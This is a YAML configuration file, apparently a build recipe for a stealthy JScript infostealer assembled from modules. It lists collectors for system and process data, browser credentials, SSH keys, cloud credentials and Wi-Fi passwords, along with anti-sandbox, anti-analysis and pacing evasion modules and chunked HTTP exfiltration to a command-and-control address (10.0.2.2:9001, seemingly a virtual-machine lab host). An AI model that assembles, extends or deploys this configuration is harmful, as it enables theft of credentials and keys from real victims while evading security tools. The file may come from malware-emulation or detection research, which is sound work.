name: js_infostealer_stealth
description: Stealthy JScript infostealer with evasion, pacing, and chunked exfil
format: jscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/security_products
  - collectors/browser_chromium
  - collectors/ssh_keys
  - collectors/cloud_creds
  - collectors/wifi_passwords

exfil: exfil/http_get_chunks
arch: arch/sequential

evasion:
  - evasion/anti_sandbox
  - evasion/anti_analysis
  - evasion/env_keying
  - evasion/deferred_exec
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
